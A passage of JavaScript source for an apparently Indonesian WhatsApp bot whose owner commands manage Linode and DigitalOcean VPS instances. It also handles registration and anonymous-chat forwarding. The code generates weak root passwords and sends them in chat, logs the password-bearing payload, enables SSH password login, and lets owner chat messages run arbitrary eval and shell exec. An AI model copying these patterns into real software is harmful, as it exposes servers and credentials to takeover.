      image: 'linode/ubuntu20.04',
      root_pass: randomKarakter(5)+randomNomor(3),
      stackscript_id: null,
      authorized_keys: null,
      backups_enabled: false
    };

    const response = await fetch('https://api.linode.com/v4/linode/instances', {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
        'Authorization': `Bearer ${linodeToken}`
      },
      body: JSON.stringify(linodeData)
    });

    const responseData = await response.json();

    if (response.ok) {
      const linodeId = responseData.id;
      m.reply(`Tunggu Sebentar...`);
      await new Promise(resolve => setTimeout(resolve, 60000));

      const linodeResponse = await fetch(`https://api.linode.com/v4/linode/instances/${linodeId}`, {
        method: 'GET',
        headers: {
          'Content-Type': 'application/json',
          'Authorization': `Bearer ${linodeToken}`
        }
      });

      const linodeInfo = await linodeResponse.json();
      const ipAddress = linodeInfo.ipv4[0];

      let messageText = `Linode berhasil dibuat!\n\n`;
      messageText += `ID: ${linodeId}\n`;
      messageText += `IP Linode: ${ipAddress}\n`;
      messageText += `Password: ${linodeData.root_pass}\n`;

      await Line.sendMessage(m.chat, { text: messageText }, {quoted: m});
    } else {
      throw new Error(`Gagal membuat Linode: ${responseData.errors[0].reason}`);
    }
  } catch (err) {
    console.error(err);
    m.reply(`Terjadi kesalahan saat membuat Linode: ${err}`);
  }
}
break

case 'listlinode': {
  if (!isOwner) return onlyOwn();
  try {
    const response = await fetch('https://api.linode.com/v4/linode/instances', {
      method: 'GET',
      headers: {
        'Content-Type': 'application/json',
        'Authorization': `Bearer ${linodeToken}`
      }
    });

    const responseData = await response.json();

    if (response.ok) {
      let messageText = 'Daftar Linode VPS:\n\n';
      responseData.data.forEach(linode => {
        messageText += `ID: ${linode.id}\n`;
        messageText += `Label: ${linode.label}\n`;
        messageText += `IP: ${linode.ipv4[0]}\n\n`;
      });

      await Line.sendMessage(m.chat, { text: messageText }, {quoted: m});
    } else {
      throw new Error(`Gagal mendapatkan daftar Linode.`);
    }
  } catch (err) {
    console.error(err);
    m.reply(`Terjadi kesalahan saat mendapatkan daftar Linode: ${err}`);
  }
}
break

case 'onlinode': {
  if (!isOwner) return onlyOwn();
  try {
    const linodeId = args[0];
    const response = await fetch(`https://api.linode.com/v4/linode/instances/${linodeId}/boot`, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
        'Authorization': `Bearer ${linodeToken}`
      }
    });

    if (response.ok) {
      m.reply(`Linode dengan ID ${linodeId} berhasil dihidupkan.`);
    } else {
      const responseData = await response.json();
      throw new Error(`Gagal menghidupkan Linode: ${responseData.errors[0]?.reason || 'Unknown Error'}`);
    }
  } catch (err) {
    console.error(err);
    m.reply(`Terjadi kesalahan saat menghidupkan Linode: ${err}`);
  }
}
break

case 'offlinode': {
  if (!isOwner) return onlyOwn();
  try {
    const linodeId = args[0];
    const response = await fetch(`https://api.linode.com/v4/linode/instances/${linodeId}/shutdown`, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
        'Authorization': `Bearer ${linodeToken}`
      }
    });

    if (response.ok) {
      m.reply(`Linode dengan ID ${linodeId} berhasil dimatikan.`);
    } else {
      const responseData = await response.json();
      throw new Error(`Gagal mematikan Linode: ${responseData.errors[0].reason}`);
    }
  } catch (err) {
    console.error(err);
    m.reply(`Terjadi kesalahan saat mematikan Linode: ${err}`);
  }
}
break

case 'rebootlinode': {
  if (!isOwner) return onlyOwn();
  try {
    const linodeId = args[0];
    const response = await fetch(`https://api.linode.com/v4/linode/instances/${linodeId}/reboot`, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
        'Authorization': `Bearer ${linodeToken}`
      }
    });

    if (response.ok) {
      m.reply(`Linode dengan ID ${linodeId} berhasil di-restart.`);
    } else {
      const responseData = await response.json();
      throw new Error(`Gagal me-restart Linode: ${responseData.errors[0].reason}`);
    }
  } catch (err) {
    console.error(err);
    m.reply(`Terjadi kesalahan saat me-restart Linode: ${err}`);
  }
}
break

case 'rebuildlinode': {
  if (!isOwner) return onlyOwn();
  try {
    const linodeId = args[0];
    const image = args[1];
    const rootPassword = randomKarakter(4)+randomNomor(3);

    const response = await fetch(`https://api.linode.com/v4/linode/instances/${linodeId}/rebuild`, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
        'Authorization': `Bearer ${linodeToken}`
      },
      body: JSON.stringify({ image, root_pass: rootPassword })
    });

    if (response.ok) {
      m.reply(`Linode dengan ID ${linodeId} berhasil di-rebuild dengan image ${image}. Password root baru: ${rootPassword}`);
    } else {
      const responseData = await response.json();
      throw new Error(`Gagal rebuild Linode: ${responseData.errors[0]?.reason || 'Unknown Error'}`);
    }
  } catch (err) {
    console.error(err);
    m.reply(`Terjadi kesalahan saat rebuild Linode: ${err}`);
  }
}
break

case 'delinode': {
  if (!isOwner) return onlyOwn();
  try {
    const linodeId = args[0];
    const response = await fetch(`https://api.linode.com/v4/linode/instances/${linodeId}`, {
      method: 'DELETE',
      headers: {
        'Content-Type': 'application/json',
        'Authorization': `Bearer ${linodeToken}`
      }
    });

    if (response.ok) {
      m.reply(`Linode dengan ID ${linodeId} berhasil dihapus.`);
    } else {
      const responseData = await response.json();
      throw new Error(`Gagal menghapus Linode: ${responseData.errors[0].reason}`);
    }
  } catch (err) {
    console.error(err);
    m.reply(`Terjadi kesalahan saat menghapus Linode: ${err}`);
  }
}
break

case 'saldolinode': {
  if (!isOwner) return onlyOwn();
  try {
    const response = await fetch('https://api.linode.com/v4/account', {
      method: 'GET',
      headers: {
        'Content-Type': 'application/json',
        'Authorization': `Bearer ${linodeToken}`
      }
    });

    const accountInfo = await response.json();

    if (response.ok) {
      const balance = accountInfo.balance / 100;
      const credit = accountInfo.credit_remaining / 100;

      let messageText = `Saldo Akun Linode:\n\n`;
      messageText += `- Balance: $${balance.toFixed(2)}\n`;
      messageText += `- Credit Remaining: $${credit.toFixed(2)}\n`;

      m.reply(messageText);
    } else {
      throw new Error(`Gagal mendapatkan saldo Linode.`);
    }
  } catch (err) {
    console.error(err);
    m.reply(`Terjadi kesalahan saat memeriksa saldo Linode: ${err}`);
  }
}
break

case 'sisalinode': {
  if (!isOwner) return onlyOwn();
  try {
    const response = await fetch('https://api.linode.com/v4/linode/instances', {
      method: 'GET',
      headers: {
        'Content-Type': 'application/json',
        'Authorization': `Bearer ${linodeToken}`
      }
    });

    const responseData = await response.json();

    if (response.ok) {
      const totalLinodes = responseData.data.length;
      m.reply(`Total Linode yang aktif: ${totalLinodes}`);
    } else {
      throw new Error(`Gagal mendapatkan data Linode.`);
    }
  } catch (err) {
    console.error(err);
    m.reply(`Terjadi kesalahan saat memeriksa jumlah Linode: ${err}`);
  }
}
break

case 'cekvpslinode': {
  if (!isOwner) return onlyOwn();
  try {
    const linodeId = args[0];
    const response = await fetch(`https://api.linode.com/v4/linode/instances/${linodeId}`, {
      method: 'GET',
      headers: {
        'Content-Type': 'application/json',
        'Authorization': `Bearer ${linodeToken}`
      }
    });

    const linodeInfo = await response.json();

    if (response.ok) {
      let messageText = `Detail Linode:\n\n`;
      messageText += `ID: ${linodeInfo.id}\n`;
      messageText += `Label: ${linodeInfo.label}\n`;
      messageText += `Status: ${linodeInfo.status}\n`;
      messageText += `Region: ${linodeInfo.region}\n`;
      messageText += `Type: ${linodeInfo.type}\n`;
      messageText += `IP: ${linodeInfo.ipv4.join(', ')}\n`;

      await Line.sendMessage(m.chat, { text: messageText }, {quoted: m});
    } else {
      throw new Error(`Gagal mendapatkan detail Linode.`);
    }
  } catch (err) {
    console.error(err);
    m.reply(`Terjadi kesalahan saat memeriksa detail Linode: ${err}`);
  }
}
break

// === Digital Ocean

case "vps-1gb": case "vps-2gb1": case "vps-2gb2": case "vps-4gb": case "vps-8gb": case "vps-16gb": {
if (!isOwner) return reply('Fitur khusus owner') 
if (!text) return Reply(example("hostname,password"))
let [hostname, password] = text.split(",");
if (!hostname || !password) return Reply(example("hostname,password"));
hostname = hostname.toLowerCase().trim();
password = password.trim();
if (!hostname.match(/^[a-zA-Z0-9-]+$/)) {
return reply("Hostname hanya boleh menggunakan huruf, angka, dan tanda hubung (-).");
}
if (password.length < 8) {
return reply("Password harus memiliki panjang minimal 8 karakter.");
}
let region = "sgp1";
let images;
switch (command) {
case "vps-1gb": images = "s-1vcpu-1gb"; break;
case "vps-2gb1": images = "s-1vcpu-2gb"; break;
case "vps-2gb2": images = "s-2vcpu-2gb"; break;
case "vps-4gb": images = "s-2vcpu-4gb"; break;
case "vps-8gb": images = "s-4vcpu-8gb"; break;
default: images = "s-4vcpu-16gb-amd"; break;
}
let dropletData = {
name: hostname,
region: region,
size: images,
image: 'ubuntu-20-04-x64',
backups: false,
ipv6: true,
user_data: `#cloud-config
password: ${password}
chpasswd: { expire: False }
ssh_pwauth: True`,
private_networking: null,
volumes: null,
tags: ['T']
};
try {
console.log("Request Payload:", dropletData);
let response = await fetch('https://api.digitalocean.com/v2/droplets', {
method: 'POST',
headers: {
'Content-Type': 'application/json',
'Authorization': "Bearer " + global.apiDigitalOcean
},
body: JSON.stringify(dropletData)
});
let responseData = await response.json();
console.log("Response Status:", response.status);
console.log("Response Body:", responseData);
if (!response.ok) {
return reply(`Gagal membuat VPS. Pesan error: ${responseData.message || "Tidak diketahui"}`);
}
let dropletId = responseData.droplet.id;
await m.reply("Memproses pembuatan VPS... Perkiraan 1-5 menit.");
await new Promise(resolve => setTimeout(resolve, 60000));
let dropletResponse = await fetch(`https://api.digitalocean.com/v2/droplets/${dropletId}`, {
method: 'GET',
headers: {
'Authorization': "Bearer " + global.apiDigitalOcean
}
});
let dropletDetails = await dropletResponse.json();
let ipVPS = dropletDetails.droplet.networks.v4[0]?.ip_address || "Tidak ada alamat IP.";
let messageText = `VPS berhasil dibuat!
🛜 ID DROPLET : ${dropletId}
⚙️ IP VPS : ${ipVPS}
📛 Username : root
🗝️ Password : ${password}`;
console.log("Mengirim pesan ke chat:", m.chat);
console.log("Isi pesan:", messageText);
await Line.sendMessage(m.chat, { text: messageText });
console.log("Pesan berhasil dikirim.");
} catch (err) {
console.error("Error:", err);
reply("Terjadi kesalahan: " + err.message);
}
}
break

case 'listdroplet': {
  if (!isOwner) return onlyOwn();

  try {
    const getDroplets = async () => {
      try {
        const response = await fetch('https://api.digitalocean.com/v2/droplets', {
          headers: {
            Authorization: `Bearer ${doToken}`
          }
        });
        const data = await response.json();
        return data.droplets || [];
      } catch (err) {
        reply('Error fetching droplets: ' + err);
        return [];
      }
    };

    getDroplets().then(droplets => {
      let totalvps = droplets.length;
      let mesej = `List droplet digital ocean kamu: ${totalvps}\n\n`;

      if (droplets.length === 0) {
        mesej += 'Tidak ada droplet yang tersedia!';
      } else {
        droplets.forEach(droplet => {
          const ipv4Addresses = droplet.networks.v4.filter(network => network.type === "public");
          const ipAddress = ipv4Addresses.length > 0 ? ipv4Addresses[0].ip_address : 'Tidak ada IP!';
          mesej += `Droplet ID: ${droplet.id}\n`;
          mesej += `Hostname: ${droplet.name}\n`;
          mesej += `Username: Root\n`;
          mesej += `IP: ${ipAddress}\n`;
          mesej += `Ram: ${droplet.memory} MB\n`;
          mesej += `Cpu: ${droplet.vcpus} CPU\n`;
          mesej += `OS: ${droplet.image.distribution}\n`;
          mesej += `Storage: ${droplet.disk} GB\n`;
          mesej += `Status: ${droplet.status}\n\n`;
        });
      }

      Line.sendMessage(m.chat, { text: mesej }, {quoted: m});
    });
  } catch (err) {
    reply('Terjadi kesalahan saat mengambil data droplet: ' + err);
  }
}
break

case 'deldroplet': {
  if (!isOwner) return onlyOwn();
  let dropletId = args[0];
  if (!dropletId) return reply('ID droplet belum diberikan!');

  const deleteDroplet = async () => {
    try {
      let response = await fetch(`https://api.digitalocean.com/v2/droplets/${dropletId}`, {
        method: 'DELETE',
        headers: {
          'Content-Type': 'application/json',
          'Authorization': `Bearer ${doToken}`
        }
      });

      if (response.ok) {
        reply('Droplet berhasil dihapus!');
      } else {
        const errorData = await response.json();
        return new Error(`Gagal menghapus droplet: ${errorData.message}`);
      }
    } catch (error) {
      console.error('Terjadi kesalahan saat menghapus droplet:', error);
      reply('Terjadi kesalahan saat menghapus droplet.');
    }
  };

  deleteDroplet();
}
break

case 'sisadroplet': {
  if (!isOwner) return onlyOwn();

  async function getDropletInfo() {
    try {
      const accountResponse = await axios.get('https://api.digitalocean.com/v2/account', {
        headers: {
          Authorization: `Bearer ${doToken}`,
        },
      });

      const dropletsResponse = await axios.get('https://api.digitalocean.com/v2/droplets', {
        headers: {
          Authorization: `Bearer ${doToken}`,
        },
      });

      if (accountResponse.status === 200 && dropletsResponse.status === 200) {
        const dropletLimit = accountResponse.data.account.droplet_limit;
        const dropletsCount = dropletsResponse.data.droplets.length;
        const remainingDroplets = dropletLimit - dropletsCount;

        return {
          dropletLimit,
          remainingDroplets,
          totalDroplets: dropletsCount,
        };
      } else {
        throw new Error('Gagal mendapatkan data akun DigitalOcean atau droplet!');
      }
    } catch (err) {
      throw new Error(err.message);
    }
  }

  async function sisadropletHandler() {
    try {
      const dropletInfo = await getDropletInfo();
      reply(`Sisa droplet yang dapat kamu pakai: ${dropletInfo.remainingDroplets}\n\nTotal droplet terpakai: ${dropletInfo.totalDroplets}`);
    } catch (err) {
      reply(`Terjadi kesalahan: ${err.message}`);
    }
  }

  sisadropletHandler();
}
break

case 'cekdroplet': {
  if (!isOwner) return onlyOwn();
  let dropletId = args[0];
  if (!dropletId) return reply('ID droplet belum diberikan!');

  const getDropletInfo = async (dropletId) => {
    try {
      const apiUrl = `https://api.digitalocean.com/v2/droplets/${dropletId}`;
      const response = await fetch(apiUrl, {
        headers: {
          'Content-Type': 'application/json',
          'Authorization': `Bearer ${doToken}`
        }
      });

      if (response.ok) {
        const data = await response.json();
        const droplet = data.droplet;
        const ipv4Addresses = droplet.networks.v4.filter(network => network.type === 'public');
        const ipAddress = ipv4Addresses.length > 0 ? ipv4Addresses[0].ip_address : 'Tidak ada IP!';
        const vpsRam = droplet.memory / 1024;

        return {
          dropletid: droplet.id,
          username: droplet.name,
          ip: ipAddress,
          ram: `${vpsRam} GB`,
          os: droplet.image.distribution,
          cpu: droplet.vcpus > 1 ? `${droplet.vcpus} vCPU` : `${droplet.vcpus} vCPUs`,
          storage: droplet.disk,
          status: droplet.status
        };
      } else {
        const errorData = await response.json();
        return new Error(`Gagal memeriksa detail droplet: ${errorData.message}`);
      }
    } catch (err) {
      reply('Terjadi kesalahan saat memeriksa detail droplet:', err.message);
      return new Error('Terjadi kesalahan saat memeriksa detail droplet.');
    }
  };

  getDropletInfo(dropletId)
    .then((info) => {
      let textku = `*DETAIL VPS KAMU*\n`;
      textku += `Droplet ID: ${info.dropletid}\n`;
      textku += `Hostname: ${info.username}\n`;
      textku += `IPv4: ${info.ip}\n`;
      textku += `Ram: ${info.ram}\n`;
      textku += `OS: ${info.os}\n`;
      textku += `CPU: ${info.cpu}\n`;
      textku += `Storage: ${info.storage}\n`;
      textku += `Status: ${info.status}`;

      Line.sendMessage(m.chat, { text: textku }, {quoted: m});
    })
    .catch((err) => {
      reply(err);
      Line.sendMessage(m.chat, { text: 'Terjadi kesalahan saat memeriksa detail VPS.' });
    });
}
break

case 'turnon': {
  if (!isOwner) return onlyOwn();
  let dropletId = args[0];
  if (!dropletId) return reply('ID droplet belum diberikan!');

  async function turnOnDroplet() {
    try {
      const response = await axios.post(
        `https://api.digitalocean.com/v2/droplets/${dropletId}/actions`,
        {
          type: 'power_on',
        },
        {
          headers: {
            'Content-Type': 'application/json',
            Authorization: `Bearer ${doToken}`,
          },
        }
      );

      if (response.status === 201 && response.data.action && response.data.action.status === 'in-progress') {
        reply('VPS (droplet) sedang dihidupkan...');
      } else {
        reply('Gagal menghidupkan VPS (droplet).');
      }
    } catch (err) {
      reply('Terjadi kesalahan saat menghidupkan VPS (droplet):', err.message);
    }
  }

  turnOnDroplet();
}
break

case 'turnoff': {
  if (!isOwner) return onlyOwn();
  let dropletId = args[0];
  if (!dropletId) return reply('ID droplet belum diberikan!');

  async function turnOffDroplet() {
    try {
      const response = await axios.post(
        `https://api.digitalocean.com/v2/droplets/${dropletId}/actions`,
        {
          type: 'power_off',
        },
        {
          headers: {
            'Content-Type': 'application/json',
            Authorization: `Bearer ${doToken}`,
          },
        }
      );

      if (response.status === 201 && response.data.action && response.data.action.status === 'in-progress') {
        reply('VPS (droplet) sedang dimatikan...');
      } else {
        reply('Gagal mematikan VPS (droplet).');
      }
    } catch (err) {
      reply('Terjadi kesalahan saat mematikan VPS (droplet):', err.message);
    }
  }

  turnOffDroplet();
}
break

case 'restartvps': {
  if (!isOwner) return onlyOwn();
  let dropletId = args[0];
  if (!dropletId) return reply('ID droplet belum diberikan!');

  const restartVPS = async (dropletId) => {
    try {
      const apiUrl = `https://api.digitalocean.com/v2/droplets/${dropletId}/actions`;
      const response = await fetch(apiUrl, {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
          Authorization: `Bearer ${doToken}`,
        },
        body: JSON.stringify({
          type: 'reboot',
        }),
      });

      if (response.ok) {
        const data = await response.json();
        return data.action;
      } else {
        const errorData = await response.json();
        reply(`Gagal melakukan restart VPS: ${errorData.message}`);
      }
    } catch (err) {
      reply('Terjadi kesalahan saat melakukan restart VPS:', err.message);
    }
  };

  restartVPS(dropletId)
    .then((action) => {
      reply(`Aksi restart VPS berhasil dimulai. Status aksi: ${action.status}`);
    })
    .catch((err) => {
      reply(err.message);
    });
}
break

// ==========================

default:

if (global.help.includes(command)) {
for (const handler of global.handlers) {
if (handler.command && handler.command.includes(command)) {
if (handler.owner && !isOwner) return onlyOwn()
if (handler.premium && !isPremium) return onlyPrem()
if (handler.group && !m.isGroup) return onlyGrup()
if (handler.botAdmin && !isBotAdmins) return onlyBotAdmin()
if (handler.admin && !isAdmins) return onlyAdmin()
if (handler.private && m.isGroup) return onlyPrivat()
let datahandler = {
isCmd, prefix, botNumber, isOwner, isAdmins, isBotAdmins, isPremium, isReseller, isGc, isPc, body, text, args, command, Line, quoted, chatUpdate
}
await handler(m, datahandler)
break
}}
}

if ((budy) && [`${db.data.users[m.sender].otp}`].includes(budy) && !m.fromMe) {
if (db.data.users[m.sender].daftar) return m.reply(`Kamu sudah terdaftar!`)
const srlnye = createSerial(5)
var angka = await randomNomor(20, 700)
m.reply(`*Berhasil mendaftar!*\n\n${monospace("INFORMASI  AKUN")}\nNama: Player-${angka}\nID: ${m.sender.split('@')[0]}\nSerial: ${srlnye}`)
db.data.users[m.sender].daftar = true
db.data.users[m.sender].nama = `Player-${angka}`
db.data.users[m.sender].otp = `${db.data.users[m.sender].otp}`
db.data.users[m.sender].email = `${db.data.users[m.sender].email}`
db.data.users[m.sender].serial = `${srlnye}`
addRegisteredUser(m.sender, `Player-${angka}`, srlnye)
}

if (m.chat.endsWith('@s.whatsapp.net')) {
this.anonymous = this.anonymous ? this.anonymous : {}
let room = Object.values(this.anonymous).find(room => [room.a, room.b].includes(m.sender) && room.state === 'CHATTING')
if (room) {
if (/^.*(start|leave|next)/.test(m.text)) return
if (['.start','.leave','.next','.mulai','.keluar','.lanjut','.skip'].includes(m.text)) return
let other = [room.a, room.b].find(user => user !== m.sender)
m.copyNForward(other, true, m.quoted && m.quoted.fromMe ? {
contextInfo: {
...m.msg.contextInfo,
forwardingScore: 0,
isForwarded: true,
participant: other
}
}:{})
}
return !0
}

if (m.chat.endsWith('@s.whatsapp.net')) {
let room = Object.values(this.menfes).find(room => [room.sender, room.receiver].includes(m.sender) && room.state === 'CHATTING')
if (room) {
let other = room.sender == m.sender ? room.receiver : room.sender
m.copyNForward(other, true, m.quoted && m.quoted.fromMe ? {
contextInfo: {
...m.msg.contextInfo,
forwardingScore: 0,
isForwarded: true,
participant: other
}} : {})
}
return true
}}

if (budy.startsWith('=> ')) {
if (!isOwner) return
function Return(sul) {
sat = JSON.stringify(sul, null, 2)
bang = util.format(sat)
if (sat == undefined) {
bang = util.format(sul)
}
return m.reply(bang)
}
try {
m.reply(util.format(eval(`(async () => { return ${budy.slice(3)} })()`)))
} catch (e) {
m.reply(util.format(e))
}}

if (budy.startsWith('> ')) {
if (!isOwner) return
try {
let evaled = await eval(budy.slice(2))
if (typeof evaled !== 'string') evaled = require('util').inspect(evaled)
await m.reply(evaled)
} catch (err) {
await m.reply(util.format(err))
}}

if (budy.startsWith('$ ')) {
if (!isOwner) return 
exec(budy.slice(2), (err, stdout) => {
if (err) return m.reply(`${err}`)
if (stdout) return m.reply(stdout)
})}

let lastErrorSentTime = 0
} catch (err) {
console.log(util.format(err))
let e = String(err)
const cooldownTime = 30000
const currentTime = new Date().getTime()
if (currentTime - lastErrorSentTime > cooldownTime) {
lastErrorSentTime = currentTime
Line.sendMessage(owner + '@s.whatsapp.net', {
text: "Hi developer, tolong perbaiki beberapa ini\n\n" + util.format(err)
})}
}}

let file = require.resolve(__filename)
fs.watchFile(file, () => {
fs.unwatchFile(file)
console.log(`Update ${__filename}`)
delete require.cache[file]
require(file)})